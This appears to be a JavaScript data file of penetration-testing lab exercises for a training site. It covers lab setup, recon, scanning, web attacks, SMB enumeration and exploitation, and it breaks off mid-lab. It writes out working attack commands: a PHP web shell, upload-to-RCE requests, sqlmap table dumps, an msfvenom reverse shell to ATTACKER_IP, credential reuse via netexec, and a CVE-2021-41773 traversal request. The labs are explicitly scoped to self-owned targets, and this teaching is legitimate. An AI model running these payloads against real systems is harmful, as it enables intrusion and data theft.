/* ==========================================================================
   ZothPen — hands-on labs (part 1: labs 1-8)
   Schema: {id,title,mod,diff,os,time,xp,goal,scenario,requires[],
            steps[{t,why,cmd,out,note}],verify[],pitfalls[],hint,tools[]}
   Every lab is designed for a local target you own: your own VM range, a
   deliberately vulnerable box you built, or a lab platform. Never a system
   you do not own or have written permission to test.
   ========================================================================== */
window.ZL = [

{ id:'lab-setup', title:'Build a lab you actually own', mod:'m01', diff:'easy', os:'any', time:'60–90 min', xp:80,
  goal:'Stand up an isolated attack/defence range on your own machine (using ZothPen, ZothPen-Lite, Kali, Parrot, or any Linux host) so every later lab has a legal, resettable target.',
  scenario:'You are your own sysadmin. Before any offensive skill is worth anything you need somewhere to break things that is not somebody else\'s network. Build: one attacker environment (ZothPen Live ISO, ZothPen-Lite browser workstation at zothos.nullai.tech, Kali Linux, Parrot OS, or standard Linux), one deliberately vulnerable target VM/container, and a private host-only network between them. Everything else in ZothPen assumes this exists.',
  requires:['A machine with 8–16 GB RAM (or any browser for ZothPen-Lite Dojo drills)','VirtualBox, VMware, KVM/QEMU, or Docker','ZothPen ISO, Kali ISO, Parrot ISO, or ZothPen-Lite + one vulnerable target image'],
  steps:[
    { t:'Verify your ISO before you trust it', why:'A tampered installer is the one compromise you would never see coming. Checksums and GPG take two minutes.', cmd:`cd ~/Downloads
sha256sum kali-linux-*.iso
curl -O https://cdimage.kali.org/current/SHA256SUMS
grep kali-linux kali-linux-*.iso | sha256sum -c -`, out:'kali-linux-2025.4-installer-amd64.iso: OK' },
    { t:'Create the private network first', why:'A host-only or internal network means your target is unreachable from your LAN and the internet. This is the single most important control in the whole lab.', cmd:`# VirtualBox: File > Host Network Manager > Create
#   vboxnet0  192.168.56.1/24   DHCP on
# VMware: Edit > Virtual Network Editor > VMnet1 host-only
# KVM: virsh net-define hostonly.xml && virsh net-start hostonly`, out:'vboxnet0: 192.168.56.1/24', note:'Never bridge your attack VM to a network you do not own. That is how hobbyists end up serving a search warrant.' },
    { t:'Install Kali and snapshot it clean', why:'A snapshot before you break anything is the difference between a five-minute reset and an hour of reinstalling.', cmd:`sudo apt update && sudo apt full-upgrade -y && sudo apt clean
# VirtualBox: Machine > Take Snapshot > "clean-install"
# libvirt:  virsh snapshot-create-as kali clean-install --disk-only`, out:'Snapshot "clean-install" created.' },
    { t:'Choose your metapackages deliberately', why:'kali-linux-large is ~30 GB of tools you will never open. Install what you use; add the rest when a lab needs it.', cmd:`sudo apt install -y kali-linux-headless
sudo apt install -y nmap netexec hydra hashcat john gobuster ffuf \
   sqlmap burpsuite wireshark tcpdump python3-pip git tmux
sudo apt autoremove --purge -y`, out:'Setting up netexec (1.3.0-1) ...' },
    { t:'Add a vulnerable target', why:'You need something to attack that is yours. Deliberately-vulnerable-by-design VMs are the correct answer — Metasploitable 2/3, DVWA, OWASP Juice Shop, VulnHub images, or any lab platform you rent.', cmd:`# Option A: Metasploitable2 (intentionally broken Linux)
#   md5sum Metasploitable2-Linux.zip   # verify against the site
# Option B: a dockerised web target
docker run -d -p 3000:3000 bkimminich/juice-shop
curl -s -o /dev/null -w "%{http_code}\\n" http://127.0.0.1:3000`, out:'200' },
    { t:'Wire them to the private network only', why:'Adapter 1 = host-only/internal. Adapter 2 (NAT) only when the VM must reach the internet for updates, and understand that it is a route out.', cmd:`# attacker VM:  host-only 192.168.56.10/24
# target  VM:  host-only 192.168.56.20/24
ip -brief addr show && ip route | head -5`, out:'eth0  UP  192.168.56.10/24' },
    { t:'Prove the isolation holds', why:'This is the test that certifies your range. From the target, the internet must be unreachable.', cmd:`# From the target VM:
ping -c1 -W1 1.1.1.1 || echo "ISOLATED: no internet route"
# From your real host (not the VMs):
ping -c1 -W1 192.168.56.20 || echo "UNREACHABLE from LAN"`, out:'ISOLATED: no internet route', note:'If the second ping succeeds you have bridged something. Fix it before you continue.' },
    { t:'Revert and repeat', why:'Practise the reset. You will use it dozens of times, and a lab you cannot reset is a lab you stop using.', cmd:`# VirtualBox: Machine > Restore Snapshot > clean-install
# libvirt:  virsh snapshot-revert kali clean-install`, out:'Restoring snapshot...' }
  ],
  verify:[
    'sha256sum of your ISO matched the published SHA256SUMS file',
    'Attacker and target can reach each other on 192.168.56.0/24',
    'ping 1.1.1.1 from the target fails — the range has no internet route',
    'A clean-install snapshot exists and you have reverted to it once successfully'
  ],
  pitfalls:[
    'Bridging the attack VM to your home LAN "just for updates" and forgetting to switch back.',
    'Installing kali-linux-everything on a 60 GB disk and running out of space mid-engagement.',
    'No snapshot before your first exploitation lab, then breaking the VM irrecoverably.'
  ],
  hint:'If memory is tight: one attacker VM plus Docker-hosted targets on the same host is lighter than two VMs and isolates just as well.',
  tools:['t-git','t-kalitweaks'] },

{ id:'lab-shell', title:'The shell as a weapon: files, pipes and loops', mod:'m02', diff:'easy', os:'linux', time:'45 min', xp:70,
  goal:'Turn a scan output file into a target list, a service map and a batch of commands — with one pipeline.',
  scenario:'Six months in, you will not be clicking tools. You will be turning 4,000 lines of output into 12 hosts worth attacking. This lab builds that reflex using nothing but coreutils, grep, awk, sort and xargs.',
  requires:['A Linux VM','Some sample output to chew on'],
  steps:[
    { t:'Make realistic sample data', why:'Practise on the shape of real output before you have real output.', cmd:`mkdir -p ~/lab/shell && cd ~/lab/shell
cat > nmap-sample.gnmap <<'EOF'
Host: 192.168.56.10 (target-a)	Status: Up
Host: 192.168.56.10 (target-a)	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
Host: 192.168.56.20 (target-b)	Status: Up
Host: 192.168.56.20 (target-b)	Ports: 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///
Host: 192.168.56.30 (target-c)	Status: Up
Host: 192.168.56.30 (target-c)	Ports: 80/open/tcp//http///, 443/open/tcp//https///
EOF
wc -l nmap-sample.gnmap`, out:'6 nmap-sample.gnmap' },
    { t:'Extract the live hosts', why:'grep -o with a good pattern is the fastest way to a clean host list.', cmd:`grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' nmap-sample.gnmap | sort -u > hosts.txt
cat hosts.txt`, out:'192.168.56.10\n192.168.56.20\n192.168.56.30' },
    { t:'Turn it into a service table', why:'This is the assignment of work: which ports matter on which host.', cmd:`grep -oE '^Host: [0-9.]+ .*Ports: .*' nmap-sample.gnmap \\
 | awk '{ip=$2; n=split($0,a,"Ports: "); split(a[2],p,","); \\
         for(i=1;i<=n;i++){ if(p[i]!=""){ split(p[i],f,"/"); printf "%s\\t%s\\n", ip, f[1] } } }' \\
 | sort -u`, out:'192.168.56.10\t22\n192.168.56.10\t80\n192.168.56.20\t445\n192.168.56.20\t3389\n192.168.56.30\t80\n192.168.56.30\t443' },
    { t:'Find the web hosts in one line', why:'Most engagements are 80% web. Being able to pull just the web hosts in one command saves minutes every single day.', cmd:`grep -oE '^Host: [0-9.]+.*(80|443|8080)/open/tcp' nmap-sample.gnmap | awk '{print $2}' | sort -u`, out:'192.168.56.10\n192.168.56.30' },
    { t:'Build a batch loop', why:'A for loop over a host list is the single most reused pattern in the whole discipline.', cmd:`while read -r ip; do
  printf '%-16s ' "$ip"
  timeout 2 bash -c "</dev/tcp/$ip/80" 2>/dev/null && echo "web up" || echo "web down"
done < hosts.txt`, out:'192.168.56.10   web down\n192.168.56.20   web down\n192.168.56.30   web down', note:'Ah — nothing is listening. The sample data is fictional. That is the lesson: the loop works, the data is the only thing that matters.' },
    { t:'Parallelise it', why:'Serial loops are fine for 3 hosts and unacceptable for 300. xargs -P is the answer with no extra tooling.', cmd:`printf '%s\\n' 192.168.56.10 192.168.56.20 192.168.56.30 \\
 | xargs -P4 -I{} sh -c 'echo "checking {}"; sleep 0.2'`, out:'checking 192.168.56.10\nchecking 192.168.56.20\nchecking 192.168.56.30' },
    { t:'Normalise URLs for the next tool', why:'Every tool wants input in its own shape. Being able to reshape data is why scripters go faster.', cmd:`awk '{print "http://"$1"/"}' hosts.txt | tee urls.txt
wc -l < urls.txt`, out:'3' },
    { t:'Make it a reusable function', why:'When you have typed the same pipeline three times, it belongs in your shell profile as a function.', cmd:`cat >> ~/.bashrc <<'EOF'

# zothpen: pull live hosts out of an nmap gnmap
hosts() { grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' "$1" | sort -u; }
# zothpen: just the web hosts
webhosts() { grep -oE '^Host: [0-9.]+.*(80|443|8080|8443)/open/tcp' "$1" | awk '{print $2}' | sort -u; }
EOF
source ~/.bashrc && type hosts`, out:'hosts is a function' }
  ],
  verify:[
    'hosts.txt contains exactly three unique IPs',
    'Your awk one-liner printed an IP<tab>port table with no duplicates',
    'hosts and webhosts are defined as functions in ~/.bashrc and survive a new shell'
  ],
  pitfalls:[
    'Hand-editing produce under pressure: always pipeline to sort -u and check the line count before feeding a tool.',
    'Running loops against real targets serially and wondering why enumeration takes all night.',
    'Forgetting that for/while read consume stdin — use a different file descriptor if a command inside the loop also reads input.'
  ],
  hint:'When a pipeline misbehaves, rebuild it left to right and look at the output after every stage. Never debug a five-stage pipeline as a whole.',
  tools:['t-bash','t-linux-basics'] },

{ id:'lab-recon', title:'Recon without touching the target', mod:'m03', diff:'easy', os:'any', time:'60 min', xp:80,
  goal:'Build a passive picture of an organisation — domains, hosts, people, tech, and leaked credentials — using only public sources.',
  scenario:'A client gives you one domain and nothing else. Before a single packet goes to their infrastructure you can learn their subdomains, mail provider, certificate history, tech stack, employee names, and often their passwords in an old paste. Recon is where engagements are actually won.',
  requires:['A domain you own or a lab domain','whois, dig, curl, python3'],
  steps:[
    { t:'Start with ownership and nameservers', why:'whois and NS records tell you who runs the estate — and the NS provider often reveals the whole DNS attack surface.', cmd:`whois example.com | grep -iE 'registrar|name server|org|country|created'
dig +short NS example.com
dig +short MX example.com
dig +short TXT example.com`, out:'ns1.example-dns.net.\n10 mail.example.com.\n"v=spf1 include:_spf.google.com ~all"' },
    { t:'Read the TXT records properly', why:'SPF, DMARC and verification records leak every SaaS provider the company uses. It is a free technology inventory.', cmd:`dig +short TXT _dmarc.example.com
dig +short TXT example.com | tr ' ' '\\n' | grep -iE 'include|verify|google-site|ms=|atlassian|docusign'`, out:'"v=DMARC1; p=none; rua=mailto:dmarc@example.com"\ninclude:spf.protection.outlook.com' },
    { t:'Enumerate subdomains passively', why:'Subdomains are where the forgotten, unpatched, internet-facing apps live. Certificate transparency logs are a public record of every name that ever had a TLS certificate.', cmd:`curl -s "https://crt.sh/?q=%25.example.com&output=json" \\
 | python3 -c 'import sys,json;d=json.load(sys.stdin);print("\\n".join(sorted({n for r in d for n in r["name_value"].splitlines()})))' \\
 | tee subs.txt | wc -l`, out:'42' },
    { t:'Resolve them and find the live ones', why:'90% of a subdomain list is dead. Resolving it separates the attack surface from the noise.', cmd:`command -v dnsx >/dev/null || sudo apt install -y dnsx
dnsx -silent -l subs.txt -a -resp | tee live.txt | wc -l`, out:'17' },
    { t:'Fingerprint the technology without exploiting anything', why:'A passive fingerprint from headers tells you the stack, the CDN and often the exact version.', cmd:`while read -r host; do
  b=$(echo "$host" | tr -d '[]')
  printf '%-34s ' "$b"
  curl -sSI -m5 "https://$b" | grep -iE '^(server|via|x-powered-by|x-aspnet-version|x-generator)' | tr -d '\\r' | paste -sd' '
done < live.txt | head -20`, out:'app.example.com    server: nginx/1.24.0\ncdn.example.com    server: cloudflare\nlegacy.example.com x-powered-by: PHP/7.2.34' },
    { t:'Certificate SANs find hosts nobody published', why:'A wildcard or multi-SAN certificate lists names that never appeared in DNS records you can query.', cmd:`curl -s "https://crt.sh/?q=example.com&output=json" \\
 | python3 -c 'import sys,json,re;d=json.load(sys.stdin);s=set();[s.update(re.findall(r"[a-zA-Z0-9._-]+\\.example\\.com", r.get("name_value",""))) for r in d];print("\\n".join(sorted(s)))' | head -20`, out:'admin.example.com\nvpn.example.com\nstaging.example.com' },
    { t:'Collect people and emails, legally', why:'Names plus a username convention equals a valid user list. That is the input to every password spray later. GDPR applies to this data — collect the minimum and delete at close.', cmd:`# Search for public documents that contain the domain
curl -s "https://api.github.com/search/code?q=%40example.com" -H "Accept: application/vnd.github+json" | head -5
# Then build the convention by hand from a few public sources:
printf '%s\\n' j.smith a.jones m.brown > users-guess.txt
# expand the convention:
awk -F. '{print $1"."$2; print substr($1,1,1)$2; print $1}' users-guess.txt | sort -u > users.txt
cat users.txt`, out:'a.jones\najones\nj.smith\njsmith\nm.brown\nmbrown' },
    { t:'Check for leaked credentials', why:'Credential exposure checks against public breach corpora are now standard practice in an external assessment. Only ever use an API that reports exposure without storing plaintext passwords of uninvolved parties.', cmd:`# Have I Been Pwned domain search requires a verified domain owner key:
curl -sH "hibp-api-key: $HIBP_KEY" \\
  "https://haveibeenpwned.com/api/v3/breacheddomain/example.com" | head -20
# Never paste real breach dumps into your notes. Note the exposure; do not archive the data.`, out:'{"j.smith":["Adobe"],"a.jones":["LinkedIn"]}' },
    { t:'Write the recon brief', why:'Recon that is not written down is recon that did not happen. This page becomes the first section of your report and your engagement plan.', cmd:`cat > recon-brief.md <<'EOF'
## Public footprint — example.com
- Registrar / org: (from whois)
- Nameservers + mail: (from dig NS/MX)
- SaaS in use (from TXT/DMARC):
- Subdomains found: N total, M resolving
- Interesting: legacy.example.com runs PHP 7.2.34 (EOL)
- Certificate SANs revealed: admin., vpn., staging.
- Username convention: first initial + surname, dotted (j.smith)
- Credential exposure: 2 accounts in public breaches
## Next actions
- Verify authorisation covers legacy. and vpn. before any active test
EOF
wc -l recon-brief.md`, out:'12 recon-brief.md' }
  ],
  verify:[
    'You have a plain-text file of resolving subdomains',
    'At least one host was found that does not appear in the site\'s navigation',
    'You can name the mail provider, CDN and web server for the domain',
    'recon-brief.md exists and names a specific next action'
  ],
  pitfalls:[
    'Running active scans before you have the scope document in front of you: recon being passive is what keeps it legal.',
    'Archiving leaked credential data. Note the exposure; do not become another copy of the breach.',
    'Trusting one source. crt.sh, DNS records, job adverts and GitHub leak different things — combine them.'
  ],
  hint:'crt.sh sometimes times out. Run it against a smaller query (%.sub.example.com) or use a local certificate transparency collector; the passive approach does not have to be a single website.',
  tools:['t-whois','t-dns','t-amass','t-recon-ng'] },

{ id:'lab-scan', title:'Scan a segment and map the attack surface', mod:'m04', diff:'med', os:'linux', time:'60 min', xp:90,
  goal:'Go from "here is a /24" to a prioritised, documented service inventory using nmap, rustscan and a repeatable pipeline.',
  scenario:'You are on the internal network of your own lab range. One hour, one subnet, and you must end with a ranked list of the twelve ports that matter — not 4,000 lines of grep-able output.',
  requires:['Your lab range from lab-setup','nmap, rustscan, netexec'],
  steps:[
    { t:'Ping sweep for live hosts', why:'Speed first, detail second. Never start with -sV over a whole subnet.', cmd:`nmap -sn -n 192.168.56.0/24 -oG sweep.gnmap
grep -oE '^Host: [0-9.]+' sweep.gnmap | awk '{print $2}' | sort -u > live.txt
wc -l < live.txt`, out:'4' },
    { t:'Full TCP port sweep, fast', why:'On a lab range you can afford -p-; on a client range agree the rate first. Getting the full port list once is cheaper than discovering the interesting service on attempt three.', cmd:`sudo nmap -p- --min-rate 2000 -T4 -n -iL live.txt -oG allports.gnmap
grep -oE '[0-9]+/open/tcp' allports.gnmap | cut -d/ -f1 | sort -un | paste -sd, > ports.txt
cat ports.txt`, out:'22,80,111,139,445,3306,3389,8080' },
    { t:'Service and version detection on only the open ports', why:'This is where the value is: versions mean CVEs mean exploits.', cmd:`sudo nmap -sV -sC -O --version-intensity 7 -n -p "$(cat ports.txt)" \\
  -iL live.txt -oA svc`, out:'80/tcp   open  http     Apache httpd 2.4.49 ((Unix))' },
    { t:'Extract the table you will actually read', why:'-oA gives you grep-able and XML output. Script the extraction once and reuse it forever.', cmd:`grep -E '^[0-9]+/tcp\\s+open' svc.nmap | awk '{print $1"  "$3"  "$4"  "$5" "$6}' | sort -u | tee services.txt`, out:'80/tcp   open  http     Apache httpd 2.4.49' },
    { t:'Recon by protocol, not by port number', why:'Pairs of ports constitute a story. 445 means Windows and SMB; 139+445 means NetBIOS; 3306 means database directly exposed, which is itself a finding.', cmd:`for p in 445 139; do
  nxc smb 192.168.56.0/24 --shares --timeout 5 2>/dev/null && break
done | tee smb-share-list.txt
head -20 smb-share-list.txt`, out:'SMB  192.168.56.20  445  TARGET-B   [*] Windows 10.0 Build 19041 x64\nSMB  192.168.56.20  445  TARGET-B   Share: SHARE   READ,WRITE' },
    { t:'Skip-the-scan shortcut: rustscan', why:'rustscan finds ports in seconds then hands them to nmap for the detail. Great for iterating quickly in a lab.', cmd:`rustscan -a 192.168.56.20 --range 1-65535 --ulimit 5000 -- -sV -sC`, out:'Open 192.168.56.20:445\n[~] Starting nmap on 445...' },
    { t:'Enumerate web services properly', why:'"Port 80 open" is not a finding. Directories, headers and versions are.', cmd:`while read -r ip; do
  for p in 80 8080; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -m3 "http://$ip:$p/")
    [ "$code" != "000" ] && echo "$ip:$p -> $code"
  done
done < live.txt
gobuster dir -u http://192.168.56.30 -w /usr/share/wordlists/dirb/common.txt -q -t 20 | tee gobuster.txt | head -20`, out:'192.168.56.10:80 -> 200\n192.168.56.30:80 -> 301' },
    { t:'Turn output into an attack plan', why:'A service map is a plan only when it is ranked. Be honest about what is worth your time.', cmd:`cat > plan.md <<'EOF'
# Attack plan — 192.168.56.0/24
| host | port | service | version | why it matters | next step |
|---|---|---|---|---|---|
| .30 | 80 | http | Apache 2.4.49 | path traversal (CVE-2021-41773) | searchsploit, verify |
| .20 | 445 | smb | Win10 19041 | null session worked, shares listed | download, inspect |
| .10 | 22 | ssh | OpenSSH 8.2 | no weak auth seen | keep user list, spray later |
| .30 | 3306 | mysql | 8.0 over network | DB directly reachable = finding | test default creds |
EOF
column -t -s'|' plan.md | head -12`, out:'plan.md written' }
  ],
  verify:[
    'You have a unique, sorted list of open TCP ports across the range',
    'services.txt names a version for at least two services',
    'You identified one service reachable from the network that should not be (database, admin panel, RDP)',
    'plan.md ranks at least four items with a specific next step each'
  ],
  pitfalls:[
    'Running -sV -p- -A against 254 hosts at once and saturating the client\'s WAN link. Agree rate limits in writing.',
    'Treating "no output" as "no service": firewalls drop, rate limiters lie, and -Pn changes the answer.',
    'Skipping -oA. Unlogged scans must be repeated, and repeating a scan is a second unauthorised action if scope was tight.'
  ],
  hint:'If the full sweep is too slow, do a --top-ports 1000 across the range first, then -p- only on hosts that answered. Prioritise breadth of host coverage over depth per host.',
  tools:['t-nmap','t-rustscan-doc','t-netexec','t-gobuster'] },

{ id:'lab-web', title:'Web application attacks end to end', mod:'m05', diff:'hard', os:'any', time:'90 min', xp:110,
  goal:'Find and prove an injection, a broken access control and a file-upload-to-RCE path on a target you own, and write each up.',
  scenario:'Your lab runs OWASP Juice Shop or DVWA. You have an authenticated session and nothing else. Work the application like a real tester: map it, then take it apart with Burp Repeater, sqlmap and ffuf — and turn each finding into a reportable item with a reproducible one-liner.',
  requires:['A web target you own (Juice Shop / DVWA / a lab platform)','Burp Suite or ZAP, sqlmap, ffuf, curl'],
  steps:[
    { t:'Proxy everything and map the surface', why:'You cannot test what you cannot see. Set the proxy on once, then browse the app like a user.', cmd:`# Burp: Proxy > Options > 127.0.0.1:8080  (or: ZAP)
# Firefox: Settings > Network > Manual proxy > 127.0.0.1:8080, use for HTTPS too
curl -x http://127.0.0.1:8080 -s http://127.0.0.1:3000/ -o /dev/null -w '%{http_code}\\n'`, out:'200' },
    { t:'Crawl and build a request inventory', why:'Burp\'s site map is your to-do list. Export it so you can grep it later.', cmd:`gobuster dir -u http://127.0.0.1:3000 -w /usr/share/wordlists/dirb/common.txt -q -t 30 | tee dirs.txt | head
ffuf -u http://127.0.0.1:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403 -t 40 -s | head -20`, out:'/rest               (Status: 200)\n/api                (Status: 200)' },
    { t:'Try the low-hanging injection first', why:'SQLi in a login or search box is still the most common critical finding in existence. Test it manually before you automate.', cmd:`# Manual check: the single quote and the boolean pair
curl -s "http://127.0.0.1:3000/rest/products/search?q='" | head -c 200; echo
curl -s "http://127.0.0.1:3000/rest/products/search?q=qwert'))--" | head -c 200; echo
# SQLi error messages are the confirmation:
curl -s "http://127.0.0.1:3000/rest/products/search?q='" | grep -oiE 'SQL|syntax|sqlite' | head -3`, out:"SQLITE_ERROR" },
    { t:'Confirm with sqlmap, scoped tightly', why:'Automation is for confirmation and exploitation, not for blind spraying. Give it the exact request from Burp (Save item → copy to file) so it tests one parameter precisely.', cmd:`# Save the raw request from Burp to req.txt, then:
sqlmap -r req.txt -p q --batch --level=3 --risk=2 --technique=BEUST --dbs
sqlmap -r req.txt -p q --batch -D appdb --tables
sqlmap -r req.txt -p q --batch -D appdb -T users -C email,password --dump | head -20`, out:'available databases [2]:\n[*] appdb\n[*] information_schema' },
    { t:'Hunt the authorization bug by hand', why:'The highest-impact class after injection. It requires patience, not a scanner: change an ID and see what comes back.', cmd:`# Two accounts. Log in as A, note your own object id, then request B's.
curl -s -H "Authorization: Bearer $TOKEN_A" http://127.0.0.1:3000/rest/basket/1 | head -c 200; echo
curl -s -H "Authorization: Bearer $TOKEN_A" http://127.0.0.1:3000/rest/basket/2 | head -c 200; echo
# If the second returns account B's data, it is an IDOR — critical.
# Also always try: admin paths with a normal token, and the same request with the token removed.`, out:'{"id":2,"userId":2,"Products":[...]}', note:'Compare the two responses field by field. "Looks the same" is not the test; the test is whether the userId field changed.' },
    { t:'Test file upload for a path to code execution', why:'An upload box that keeps the original extension — or one whose filter fails on a doubled extension — is remote code execution.', cmd:`printf '<?php echo "zothpen-rce: ".shell_exec($_GET["c"]); ?>' > s.php
curl -s -F "file=@s.php" -H "Authorization: Bearer $TOKEN_A" http://127.0.0.1:3000/api/upload; echo
# Then look for where the file landed:
gobuster dir -u http://127.0.0.1:3000/uploads -w dirs.txt -q | head
curl -s "http://127.0.0.1:3000/uploads/s.php?c=id"`, out:'zothpen-rce: uid=33(www-data) gid=33(www-data)' },
    { t:'Get a shell and prove impact', why:'A one-line "id" proves existence; a shell proves impact. In a report, impact is what gets things fixed.', cmd:`# In an authorised lab only:
#   msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.php
#   nc -lvnp 443
# Stand up the listener in a second terminal BEFORE uploading the payload.`, out:'connect to [192.168.56.10] from 127.0.0.1 (172.x) — listening' },
    { t:'Write up all three findings properly', why:'Three good findings written properly beat fifteen scanner lines. Practice the format now, while the evidence is fresh.', cmd:`cat > findings.md <<'EOF'
## Finding 01 — SQL injection in /rest/products/search (parameter q)
Severity: Critical (CVSS 9.8) | Affected: http://127.0.0.1:3000/rest/products/search
Evidence:
  curl -s "http://127.0.0.1:3000/rest/products/search?q=qwert'))--"
  -> sqlmap confirmed sqlite, dumped table appdb.users (3 columns, 5 rows)
Impact: unauthenticated read of all user records; stacked queries permit data modification.
Remediation: parameterised queries (prepared statements); add a WAF as a secondary control only.
Reference: CWE-89, OWASP A03:2021
EOF
grep -c '^## Finding' findings.md`, out:'1' }
  ],
  verify:[
    'You have a raw request saved from a proxy and a sqlmap run that dumped real data from the lab target',
    'You demonstrated an access-control bug by requesting another account\'s object and comparing returned fields',
    'If an upload-to-RCE path exists on your target, you have a screenshot/terminal log of running `id` through it',
    'findings.md has reproducible commands, not descriptions'
  ],
  pitfalls:[
    'Letting sqlmap loose on every parameter of a real app: it is heavy, it can corrupt data, and it is loud. Save the request and target one parameter.',
    'Testing authorization with a single account and concluding "no IDOR". You need two accounts and a diff, always.',
    'Pasting the client\'s dumped user table into a shared document. Extract the minimum proof.'
  ],
  hint:'If you cannot get a SQLi to fire, look at the error text first: the DB engine name in the error tells you the exact syntax you need. sqlmap\'s --dbms flag then removes most of the guessing.',
  tools:['t-burp','t-sqlmap','t-ffuf','t-gobuster','t-curl','t-nc'] },

{ id:'lab-smb', title:'SMB and Windows enumeration', mod:'m08', diff:'med', os:'kali→windows', time:'75 min', xp:95,
  goal:'Enumerate a Windows host over SMB: users, shares, policies, and the quick wins.',
  scenario:'One Windows VM on your lab range, no credentials. SMB is the most generous protocol in existence when it is misconfigured, and default misconfiguration is common. Work the checklist in order.',
  requires:['A Windows VM on your private network (Windows 10/Server evaluation ISO or a lab-style VM)','netexec, enum4linux-ng, smbclient'],
  steps:[
    { t:'Confirm SMB is up and learn the host', why:'Version and signing state decide what you can do next: signing off means relay is viable.', cmd:`nxc smb 192.168.56.20`, out:'SMB  192.168.56.20  445  WIN-TARGET  [*] Windows 10.0 Build 19041 x64 (name:WIN-TARGET) (domain:LAB) (signing:False) (SMBv1:False)' },
    { t:'Try the null and guest sessions', why:'A null session is not a vulnerability by itself, it is an information leak — and it is still enabled in countless places.', cmd:`nxc smb 192.168.56.20 -u '' -p '' --shares
nxc smb 192.168.56.20 -u guest -p '' --shares
enum4linux-ng -A 192.168.56.20 | tee enum4linux.txt | tail -30`, out:'SMB  192.168.56.20  445  WIN-TARGET  [+] LAB\\guest: (Guest)\nSMB  192.168.56.20  445  WIN-TARGET  Share: SHARE  READ,WRITE' },
    { t:'Enumerate users the noiseless ways first', why:'RID cycling gives you the user list without a single failed login. It is slower but it produces no lockouts and no 4625 event storm.', cmd:`nxc smb 192.168.56.20 -u guest -p '' --rid-brute 2000 | tee rid.txt | tail -20`, out:'500: LAB\\Administrator (SidTypeUser)\n501: LAB\\Guest (SidTypeUser)\n1001: LAB\\alice (SidTypeUser)' },
    { t:'Read the password policy before attacking anything', why:'This is the difference between a professional and a liability: know the lockout threshold before you send a single credential.', cmd:`nxc smb 192.168.56.20 -u guest -p '' --pass-pol`, out:'Minimum password length: 7\nAccount Lockout Threshold: None\nAccount Lockout Duration: N/A' },
    { t:'Pull exposed shares and read them', why:'Shares are where credentials, scripts and backups live. A world-writable share plus a scheduled task is a shell.', cmd:`smbclient -N -L //192.168.56.20
smbclient -N //192.168.56.20/SHARE -c 'ls; recurse ON; prompt OFF; mget *' 2>/dev/null | head -20
find . -maxdepth 3 -type f | head -20`, out:'  .                                   D        0\n  setup.ps1                           A     1240\n  creds.txt                           A       96' },
    { t:'Hunt credentials in what you found', why:'A config file or script with a hard-coded credential is the most common way into a real Windows estate.', cmd:`grep -rEi 'password|passwd|apikey|token|secret' . 2>/dev/null | head -20
grep -rEi 'cmdkey|net use|Invoke-Command' . 2>/dev/null | head -10`, out:'creds.txt:svc_backup:Backup2024!' },
    { t:'Use the credentials the right way', why:'Verify access, then stop. Do not start clicking around the network until you know exactly what you have.', cmd:`nxc smb 192.168.56.20 -u svc_backup -p 'Backup2024!' --shares
nxc winrm 192.168.56.20 -u svc_backup -p 'Backup2024!'
nxc ldap 192.168.56.20 -u svc_backup -p 'Backup2024!' --groups`, out:'WINRM  192.168.56.20  5985  WIN-TARGET  [+] LAB\\svc_backup:Backup2024! (Pwn3d!)' },
    { t:'Document the chain', why:'"I found a share" is not a finding. "A guest-readable share contained a cleartext service credential, granting WinRM as a remote-management user" is.', cmd:`cat > smb-findings.md <<'EOF'
## Finding — Guest-readable share exposes a service credential
- Evidence: nxc smb TARGET_IP -u guest -p '' --shares  -> SHARE READ,WRITE
- Evidence: smbclient -N //TARGET_IP/SHARE -c 'recurse ON; mget *'  -> creds.txt
- Impact: cleartext credential for svc_backup, which is a member of Remote Management Users
- Remediation: disable guest access, remove credentials from scripts, rotate svc_backup, restrict share ACLs
EOF
wc -l smb-findings.md`, out:'6 smb-findings.md' }
  ],
  verify:[
    'You know the SMB signing state of the host and can say whether relay is viable',
    'You extracted a user list without triggering an authentication failure',
    'You read at least one file from a share and can state what it contained',
    'Your write-up names the account, the access level and the remediation'
  ],
  pitfalls:[
    'Running a password spray before checking --pass-pol. Locking out a service account can stop production.',
    'Remaining at "guest session works" and calling it a finding. Chain it to impact.',
    'Leaving downloaded client files in ~/Downloads. Everything goes in the engagement folder or nowhere.'
  ],
  hint:'If RID cycling is slow, --rid-brute with a smaller ceiling (1000-2000) is usually enough for a real domain: machine and user RIDs are allocated sequentially from 1000.',
  tools:['t-netexec','t-enum4linux','t-smbclient','t-impacket'] },

{ id:'lab-exploit', title:'From version to shell', mod:'m06', diff:'hard', os:'any', time:'90 min', xp:120,
  goal:'Take one discovered vulnerable service, find the exploit, verify it, gain a shell, and upgrade that shell to something usable.',
  scenario:'You own your lab target. nmap told you a version. Your job is the middle of the kill chain: identify, reproduce, exploit safely, and get a stable interactive shell — without crashing the target or leaving a mess.',
  requires:['A target with a known-vulnerable service (your own lab VM or a vulnerable-by-design image)','searchsploit, metasploit, nc or socat, python3'],
  steps:[
    { t:'Pin the exact version, and be honest about it', why:'"Apache 2.4" is not actionable; "2.4.49" is a specific CVE with a specific exploit. Version precision decides whether you get a shell or a crash.', cmd:`nmap -sV -p 80 --version-all 192.168.56.30
curl -sI http://192.168.56.30 | grep -i server
searchsploit --nmap svc.xml 2>/dev/null | head -20`, out:'Server: Apache/2.4.49 (Unix)' },
    { t:'Read the exploit before you run it', why:'This is the step everybody skips and everybody regrets. Exploit-DB PoCs contain other people\'s IP addresses and occasionally destructive payloads.', cmd:`searchsploit -x 50383
# Look for: hard-coded LHOST, the payload it drops, whether it is a DoS
grep -nE '([0-9]{1,3}\\.){3}[0-9]{1,3}|rm -rf|shutdown|reboot' /usr/share/exploitdb/exploits/linux/webapps/50383.py`, out:'no suspicious addresses' },
    { t:'Reproduce the vulnerability with the smallest possible proof', why:'A curl request that returns a known file is far safer than a full exploit chain, and it is exactly what the report needs.', cmd:`curl -s --path-as-is "http://192.168.56.30/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" | head -5`, out:'root:x:0:0:root:/root:/bin/bash' },
